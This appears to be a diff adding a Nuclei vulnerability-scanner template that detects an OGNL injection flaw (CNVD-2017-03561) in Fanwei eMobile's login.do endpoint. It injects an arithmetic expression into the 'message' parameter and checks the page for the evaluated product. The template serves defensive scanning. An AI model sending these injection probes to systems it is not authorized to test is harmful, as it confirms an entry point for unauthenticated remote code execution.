@@ -1,0 +1,28 @@
+id: fanwei-emobile-ognl-injection-cnvd-2017-03561
+info:
+  name: 泛微eMobile OGNL注入漏洞 (CNVD-2017-03561)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: expression-injection,cnvd-2017-03561
+  description: |
+    泛微eMobile OGNL注入漏洞导致远程攻击者可以通过漏洞进行未授权的远程代码执行。
+
+variables:
+  num1: "{{rand_int(800000, 999999)}}"
+  num2: "{{rand_int(800000, 999999)}}"
+  result: "{{to_number(num1) * to_number(num2)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/login.do?message={{num1}}*{{num2}}"
+      - "{{BaseURL}}/login/login.do?message={{num1}}*{{num2}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{result}}"
+        part: body
